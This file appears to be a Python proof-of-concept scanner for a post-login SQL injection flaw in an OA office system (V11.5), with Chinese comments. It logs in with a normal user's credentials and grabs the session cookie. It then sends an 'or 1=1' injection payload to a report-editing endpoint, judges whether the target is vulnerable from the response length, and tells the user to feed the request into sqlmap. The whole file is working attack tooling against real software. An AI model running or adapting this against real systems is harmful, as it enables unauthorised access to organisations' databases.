import requests
import re
import time
import base64

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'
s = requests.session() # 初始化requests.session()会话对象，保持cookie

def login(host,username,password):
    url_login = host +"logincheck.php"
    # UNAME=chenqiang&PASSWORD=&encode_type=1
    passwd =base64.b64encode(password.encode())
    data={
        'UNAME':username,
        'PASSWORD':passwd,
        'encode_type':1
    }
    res = s.post(url=url_login,data=data,verify=False)
    if "正在进入OA系统" in res.text:
        print(GREEN + "[*] 登录成功" + END)
    else:
        print(RED + "[-] 登录失败" + END)
    PHPSESSION = re.findall(r'PHPSESSID=(.*?);',str(res.headers))[0]
    print(GREEN + "成功获得cookie：PHPSESSID=",GREEN + PHPSESSION + END,sep='' + END)
    return PHPSESSION

def sql_injection(host,username,password):
    login(host,username,password)
    # headers = {'Accept-Encoding': "identity"}
    url = host + "general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 or 1=1#"
    try:
        res = s.get(url=url)
        # print(res.text)
        length = len(res.text) #通过判断返回包的长度
        if length > 50000:
            print(GREEN + '[*] 存在SQL注入漏洞' + END)
            print(GREEN + '请将请求包放入sqlmap跑\n' + END)
        else:
            print(RED + "[-] 不存在该漏洞\n" + END)
    except:
        pass


def run(host):
    print(CYAN + "[->] 正在测试V11.5后台SQL注入漏洞，需要一个普通账号" + END)
    username = input("请输入username：")
    password = input("请输入password：")
    sql_injection(host,username,password)